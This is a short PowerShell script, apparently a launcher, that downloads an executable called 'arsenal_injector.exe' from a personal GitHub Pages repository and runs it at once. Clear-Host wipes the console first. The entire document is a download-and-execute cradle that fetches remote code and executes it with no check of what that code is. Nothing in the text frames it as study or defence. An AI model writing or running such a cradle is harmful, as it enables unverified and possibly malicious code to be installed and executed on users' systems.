$ProcName = "arsenal_injector.exe"
$WebFile = "https://github.com/creepyturnip/creepyturnip.github.io/raw/main/personal/$ProcName"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$ProcName")
Start-Process ("$ProcName")
